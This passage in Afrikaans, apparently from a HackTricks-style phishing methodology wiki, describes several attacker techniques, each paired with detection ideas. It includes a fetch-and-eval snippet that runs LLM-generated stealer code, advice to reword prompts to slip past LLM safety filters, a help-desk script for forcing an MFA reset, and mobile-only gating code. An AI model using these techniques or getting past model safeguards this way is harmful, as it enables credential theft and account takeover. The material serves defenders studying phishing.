|Agentiese AI|Registreer outonoom domeine, skraap open-source-intelligensie en skep opvolg-e-posse wanneer ’n slagoffer klik, maar nie geloofsbriewe indien nie.|

**Verdediging:**  
• Voeg **dinamiese baniere** by wat boodskappe uitlig wat deur onbetroubare outomatisering gestuur is (via ARC/DKIM-afwykings).  
• Gebruik **stem-biometriese uitdagingsfrases** vir hoërisiko-telefoniese versoeke.  
• Simuleer voortdurend AI-gegenereerde lokboodskappe in bewusmakingsprogramme – statiese sjablone is verouderd.

Sien ook – misbruik van agentiese blaai vir geloofsbrief-phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Sien ook – misbruik van AI-agente van plaaslike CLI-gereedskap en MCP (vir inventarisering en opsporing van geheime):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-ondersteunde samestelling van phishing-JavaScript tydens looptyd (kodegenerering in die blaaier)

Aanvallers kan HTML stuur wat onskuldig lyk en **die stealer tydens looptyd genereer** deur ’n **vertroude LLM-API** vir JavaScript te vra en dit dan in die blaaier uit te voer (bv. met `eval` of ’n dinamiese `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt as obfuskasie:** enkodeer exfil-URL’s/Base64-stringe in die prompt; verander die bewoording herhaaldelik om veiligheidsfilters te omseil en hallusinasies te verminder.
2. **API-oproep aan kliëntkant:** wanneer die bladsy laai, roep JavaScript ’n openbare LLM (Gemini/DeepSeek/ens.) of ’n CDN-proxy aan; slegs die prompt/API-oproep is in die statiese HTML teenwoordig.
3. **Stel saam en voer uit:** voeg die antwoord aaneen en voer dit uit (polimorfies per besoek):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** gegenereerde kode verpersoonlik die lokmiddel (bv. LogoKit-tokenontleding) en stuur aanmeldbesonderhede na die eindpunt wat in die prompt versteek is.

**Ontduikingskenmerke**
- Verkeer gaan na bekende LLM-domeine of betroubare CDN-proxy’s; soms via WebSockets na ’n backend.
- Geen statiese payload nie; kwaadwillige JS bestaan eers ná rendering.
- Nie-deterministiese generering lewer **unieke** stealers per sessie op.

**Opsporingsidees**
- Laat sandboxes met JS geaktiveer loop; merk **runtime-`eval`/dinamiese skripskepping wat uit LLM-antwoorde kom**.
- Soek na POST-versoeke vanaf die frontend na LLM-API’s wat onmiddellik gevolg word deur `eval`/`Function` op teruggekeerde teks.
- Stel waarskuwings in vir ongemagtigde LLM-domeine in kliëntverkeer, gevolg deur credential-POST-versoeke.

---

## MFA-uitputting / Push Bombing-variant – Gedwonge terugstelling
Benewens klassieke push-bombing dwing operators eenvoudig **’n nuwe MFA-registrasie af** tydens die oproep met die hulptoonbank, wat die gebruiker se bestaande token ongeldig maak. Enige daaropvolgende aanmeldversoek lyk vir die slagoffer legitiem.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Monitor vir AzureAD/AWS/Okta-gebeurtenisse waar **`deleteMFA` + `addMFA`** **binne minute vanaf dieselfde IP** plaasvind.



## Clipboard Hijacking / Pastejacking

Aanvallers kan stilweg kwaadwillige opdragte vanaf ’n gekompromitteerde of typosquatted-webblad na die slagoffer se knipbord kopieer en die gebruiker dan mislei om dit in **Win + R**, **Win + X** of ’n terminalvenster te plak. Dit voer arbitrêre kode uit sonder enige aflaai of aanhegsel.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobiele Phishing en Verspreiding van Kwaadwillige Toepassings (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Kapingsaanval op WhatsApp-toestelkoppeling via QR-sosiale manipulasie
* ’n Lokbladsy (bv. ’n vals ministerie-/CERT-“kanaal”) vertoon ’n WhatsApp Web/Desktop-QR-kode en gee die slagoffer opdrag om dit te skandeer. Dit voeg die aanvaller stilweg as ’n **gekoppelde toestel** by.<sup>[[12]](#references)</sup>
* Die aanvaller kry onmiddellik toegang tot die kletse en kontakte totdat die sessie verwyder word. Slagoffers kan later ’n kennisgewing sien dat ’n “nuwe toestel gekoppel” is; verdedigers kan soek na onverwagte toestelkoppelingsgebeurtenisse kort ná besoeke aan onbetroubare QR-bladsye.

### Mobiel-beperkte phishing om crawlers/sandboxes te ontduik
Operateurs beperk hul phishing-vloei toenemend met ’n eenvoudige toestelkontrole, sodat desktop-crawlers nooit die finale bladsye bereik nie. ’n Algemene patroon is ’n klein skrip wat toets of die DOM aanraakfunksies ondersteun en die uitslag na ’n bediener-eindpunt stuur; nie-mobiele kliënte ontvang HTTP 500 (of ’n leë bladsy), terwyl mobiele gebruikers die volledige vloei kry.<sup>[[7]](#references)</sup>

Minimale kliëntkodebrokkie (tipiese logika):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js`-logika (vereenvoudig):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Bedienergedrag wat dikwels waargeneem word:
- Stel ’n sessiekoekie tydens die eerste laai in.
- Aanvaar `POST /detect {"is_mobile":true|false}`.
- Gee 500 (of ’n plekhouer) terug vir daaropvolgende GET-versoeke wanneer `is_mobile=false`; lewer slegs phishing-inhoud as `true`.

Heuristieke vir opsporing en ondersoek:
- urlscan-navraag: `filename:"detect_device.js" AND page.status:500`
- Webtelemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie-selfoontoestelle; wettige slagofferpaaie vanaf selfoontoestelle gee 200 terug, gevolg deur HTML/JS.
- Blokkeer of ondersoek bladsye wat inhoud uitsluitlik op grond van `ontouchstart` of soortgelyke toestelkontroles wys.

Verdedigingswenke:
- Voer crawlers met selfoonagtige vingerafdrukke en JS geaktiveer uit om inhoud wat agter kontroles versteek word, te onthul.
- Stel waarskuwings in vir verdagte 500-antwoorde ná `POST /detect` op domeine wat onlangs geregistreer is.

## References

- [1] [Genereer domeinvariasies wat in phishing gebruik word (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing opspoor: Gereedskap en tegnieke (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Steel aanmeldbesonderhede en omseil 2FA met noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Hoe om DKIM met Postfix op Debian Wheezy te installeer en op te stel (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42-verslag oor wêreldwye voorvalreaksie – Uitgawe oor sosiale manipulasie](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Stil smishing – selfoonbeperkte phishing-infrastruktuur en heuristieke (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Die volgende grens van aanvalle met samestelling tydens looptyd: Gebruik van LLM’s om phishing-JavaScript intyds te genereer](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Identiteitsnabootsing, klik-kaping en TDS: Binne ’n malware-verspreidingsekosisteem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting van Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Verkeer na Microsoft se windows.com kaap met bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Liefde? Eintlik: Vervalste dating-app as lokmiddel in geteikende spyware-veldtog in Pakistan gebruik](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC’s en voorbeelde](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
